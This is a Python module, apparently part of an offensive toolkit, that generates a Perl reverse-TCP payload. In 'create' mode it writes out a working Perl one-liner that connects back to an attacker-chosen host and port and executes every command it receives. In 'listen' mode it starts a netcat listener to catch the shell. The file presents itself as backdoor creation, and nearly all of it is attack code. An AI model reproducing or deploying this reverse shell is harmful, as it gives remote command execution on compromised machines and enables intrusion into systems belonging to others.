import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_perl_2_reverse_tcp",
        "title"       : "Payload perl",
        "module"      : "payloads/nc/perl/reverse_tcp unix linux",
        "description" : "Payload creation and exploitation"
}

var.lname = ["payload.pl"]
var.ltype = ["listen"]

options ={
  "LHOST" : [str(var.lhost[0]),'The listen address'],
  "LPORT" : [str(var.lport[0]),'The listen port'],
  "LNAME" : [str(var.lname[0]),'The name of payload'],
  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark  = '"'
            mark2 = ':'
            f = open(var.lname[0] , 'w')
            payload = '''
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"'''+var.lhost[0]+mark2+var.lport[0]+mark+''' );STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

'''
            f.write(payload)
            f.close()

        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
            os.system("nc -l -p "+str(var.lport[0])+" -v")

        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
